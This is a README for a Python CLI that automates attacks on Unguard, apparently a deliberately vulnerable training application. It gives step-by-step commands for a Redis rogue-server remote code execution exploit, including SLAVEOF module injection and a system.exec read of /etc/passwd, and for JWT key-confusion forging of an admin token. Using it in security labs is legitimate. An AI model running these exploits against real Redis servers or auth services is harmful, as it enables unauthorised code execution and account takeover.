# Unguard Exploits CLI

Small command line application written in Python that automates different attack scenarios for the Unguard application.

## Installation

Create and activate the virtual environment for the `unguard-exploit` package

```
python -m venv venv
source ./venv/bin/activate
pip install --editable .
```

Check out what you can do now
 
```
vg-exploit --help
```

## General Usage

Make sure to login first

```
vg-exploit login <USERNAME>
```

Next, send your payloads. Make sure to specify the Redis instance that is reachable from the frontend.
Within Docker or K8S, this should be `unguard-redis:6379`.

```
vg-exploit redis --redis-host unguard-redis:6379 .\redis_payloads\hackedflag.txt
```

## Remote Code Execution (RCE)

For this exploit to work, you need to first start a Redis rogue server.

This exploit (for Redis 4.x and 5.x) was inspired by [Redis Post-Exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).
The code was taken and adapted from [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server).

The rogue server acts as a fake Redis master host and can upload a shared library to a real Redis.

### Usage

#### Kubernetes Deployment

If you run Unguard inside Kubernetes it may be that your Redis instance can not access the local rogue server.
For that, build and run the following temporary container in your cluster.
Make sure to use the K8S Docker environment as explained in the root README.

```
docker build --tag redis-rogue-server .\redis_payloads\redis-rogue-server
kubectl run redis-rogue-server --rm -i --tty --expose --port 6666 \
    --image-pull-policy=IfNotPresent --image redis-rogue-server
```

It might be the case that you don't see proper console output.

#### Local Deployment

Build the `module.so` from the already linked git submodule from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

```
git submodule init
git submodule update

cd ./redis_payloads/redis-rogue-server/RedisModules-ExecuteCommand

make
```

Move back to `./redis_payloads/redis-rogue-server` and start the server to listen on all interfaces on port `6666`

```
cd redis-rogue-server
python redis-rogue-server.py --lhost 0.0.0.0 --lport 6666
```

Inside the `./redis_payloads/rce.txt` change the `SLAVEOF` command so that it points to the ip address and port of your rogue server.
Then, run the RCE exploit, which makes our rogue server a slave and injects the `module.so` to `/tmp/exp.so`

```
vg-exploit redis --redis-host unguard-redis:6379 .\redis_payloads\rce.txt
```

You should see some output on your rogue server on success, and the exploit should already have created the file `/tmp/maliciousfile`

The compromised Redis instance can now execute arbitrary code like so

```
$ redis-cli
127.0.0.1:6379> system.exec cat${IFS}/etc/passwd
# will print /etc/passwd from Redis host
```

You don't need the rogue server anymore.

## JWT KeyConfusion Attack
For this exploit to work you need login via the login-command before.
Further details and a writeup about the vulnerability are available in the user-auth-service project.

### Usage
To forge a JWT token just provide the usertag which is a combination of username:userid.

!Attention! The username and userid have to match, otherwise the forged token will not have the right permissions.
```
$ vg-exploit forge-token admin:1
```

Now you can either use vg-exploit with the forged-user(logged in automatically) or use the forged token, which is printed to the command-line manually.
